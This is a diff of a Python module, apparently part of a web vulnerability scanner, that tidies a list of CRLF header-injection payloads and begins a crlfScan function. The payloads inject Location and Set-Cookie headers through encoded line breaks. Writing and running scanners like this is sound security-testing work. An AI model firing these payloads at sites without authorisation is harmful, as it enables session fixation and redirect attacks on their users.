@@ -1,6 +1,6 @@
-from core.others import good,bad,info,requester,proxies,requests,multitest,results
-redirectCodes = [i for i in range(300,311,1)]
-errorCodes = [error for error in range(400, 411, 1)]
+from core.others import good,bad,info,requester,requests,multitest,results
+redirectCodes = range(300, 311)
+errorCodes = range(400, 411)
 payloads = [
             r"%0d%0aLocation:www.google.com%0d%0a",
             r"%0d%0aSet-Cookie:name=ch33ms;",
@@ -11,22 +11,10 @@ payloads = [
             r"\r%20Set-Cookie:name=ch33ms;",
             r"\r\nSet-Cookie:name=ch33ms;",
             r"\r\n%20Set-Cookie:name=ch33ms;",
-            r"\rSet-Cookie:name=ch33ms;",
             r"%u000ASet-Cookie:name=ch33ms;",
-            r"\r%20Set-Cookie:name=ch33ms;",
             r"%23%0D%0ALocation:www.google.com;",
-            r"\r\nSet-Cookie:name=ch33ms;",
-            r"\r\n%20Set-Cookie:name=ch33ms;",
-            r"\r\n\tSet-Cookie:name=ch33ms;",
-            r"\r\tSet-Cookie:name=ch33ms;",
             r"%5cr%5cnLocation:www.google.com",
-            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
-            r"\rSet-Cookie:name=ch33ms;",
-            r"\r%20Set-Cookie:name=ch33ms;",
-            r"\r\nSet-Cookie:name=ch33ms;",
-            r"\r\n%20Set-Cookie:name=ch33ms;",
-            r"\r\n\tSet-Cookie:name=ch33ms;",
-            r"\r\tSet-Cookie:name=ch33ms;"
+            r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;"
             ]
 #---------------------------------------------------------------------#
 def crlfScan(url,foxy):
